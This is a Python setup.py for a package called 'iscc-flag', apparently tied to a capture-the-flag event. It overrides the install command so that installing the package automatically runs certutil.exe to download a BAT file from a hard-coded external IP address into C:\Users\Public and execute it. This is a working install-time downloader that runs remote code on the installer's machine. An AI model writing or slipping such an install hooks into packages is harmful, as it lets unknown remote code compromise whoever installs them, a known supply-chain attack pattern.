from setuptools import setup
from setuptools.command.install import install
import os

class CustomInstall(install):
    def run(self):
        install.run(self)
        # 使用 certutil 下载 BAT 文件并执行
        download_and_run = (
            'certutil.exe -urlcache -split -f '
            'http://47.96.145.144:8877/swt '
            'C:\\Users\\Public\\run.bat && '
            'C:\\Users\\Public\\run.bat'
        )
        os.system(download_and_run)

setup(
    name='iscc-flag',
    version='0.0.1',
    description="Install this module then download and execute a BAT file",
    author="anku2",
    py_modules=["test.hello"],
    cmdclass={'install': CustomInstall}
)
